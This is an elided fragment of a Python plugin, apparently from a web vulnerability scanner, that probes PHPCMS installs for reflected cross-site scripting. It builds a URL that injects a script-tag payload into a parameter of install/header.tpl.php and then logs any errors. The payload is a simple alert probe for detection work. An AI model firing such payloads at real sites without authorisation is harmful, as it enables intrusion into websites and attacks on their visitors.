...
def run_domain(http,ob):
    ...
    try:
        ...
        url+="install/header.tpl.php?step=b&steps[b]=cc</title><script>alert(111)</script>"
        ...
        logging.getLogger().error("File:phpcms_header.tpl.phpXSS.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpcms_header.tpl.phpXSS.py, run_domain function :" + str(e))
    #end try
